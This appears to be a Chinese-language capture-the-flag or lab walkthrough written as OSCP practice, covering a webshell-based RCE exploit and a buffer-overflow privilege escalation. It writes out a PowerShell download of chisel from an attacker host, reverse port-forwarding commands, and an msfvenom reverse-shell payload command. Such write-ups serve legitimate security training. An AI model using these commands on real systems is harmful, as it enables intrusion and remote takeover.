## 阶段2：工具及利用

### 阶段2.1：未经身份验证的远程代码执行

![](../Images/6fd8533939bfca0db9b452d42366057f.png)  
尝试google找找有没有利用，发现一个可利用的 `Unauthenticated Remote Code Execution`。  
![](../Images/63e016fca357740cb4f243f0c52ec044.png)  
使用 `exploit`（https://www.exploit-db.com/exploits/48506） 成功返回一个伪交互终端。  
![](../Images/c956bef74131302c0ee9edaa87b25651.png)分下了一下该python代码，实际上是上传了一个新的webshell文件，然后进行命令执行。直接输入exploit中的url路径即可。  
![](../Images/0257a524b21b71eff0be7381a5c8ce2c.png)为了看的更信息的过程，在exploit中加入代理。

```

    proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", }  
```

![](../Images/68912235ec0e7afbb38a14ed7a780df5.png)  
具体漏洞的产生原因可以查看exploit的注释部分，首先bypass了文件后缀，使其满足图片后缀，其次bypass了文件类型，使其符合比对的图片类型，最后根据代码执行逻辑会对文件进行重命名。  
![](../Images/95e85aff9fb8d4d4a531f7cc34ee99f7.png)

通过Webshell成功读取到 user.txt。

注意：不建议这样做，因为在考OSCP时是需要具备完整tty的交互终端截图，不认可webshell这种伪终端。

### 阶段3.3：端口转发及溢出攻击

查询exploit发现对应版本存在缓存区溢出漏洞。  
![](../Images/b2c7a59706c014e2f2fb23e98b1c28a4.png)查看利用脚本，发现需要连接一个`8888`的端口。  
![](../Images/9752571bd0d1f5a1dfb1ad242e39f62a.png)  
查看后发现存在本地监听，说明可以利用。  
![](../Images/cdd2854a990b89787a29d237bbd5bde7.png)

尝试进行端口转发，这里我用的是 `chisel`（发现这东西老外用的多，学习了）。

服务器下载对应程序：`powershell Invoke-WebRequest "http://10.10.16.6/chisel.exe" -OutFile "chisel.exe"`

Kali上开启反向转发：`./chisel_1.7.6_linux_amd64 server --port 9901 --reverse`  
![](../Images/766d405f24965d7a1018c6d44a830341.png)

服务器将本地888端口转发至kali对应端口：`chisel.exe client 10.10.16.6:9901 R:8888:127.0.0.1:8888`  
![](../Images/7db5b80bf5b0e9305ba7aed06887714b.png)  
开启MSF的端口监听（我了解了下，OSCP里是允许仅使用`exploit/multi/handler`和`msfvenom`的），生成上线shellcode：  
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=9991 EXITFUNC=thread -b "\x00\x0d\x0a" -f python`

![](../Images/70ffdd0fd6e210a2fc0d74707aa8a4df.png)  
将缓存溢出的exploit脚本内容中的shellcode进行替换，执行脚本就获得了一个高权限的session。
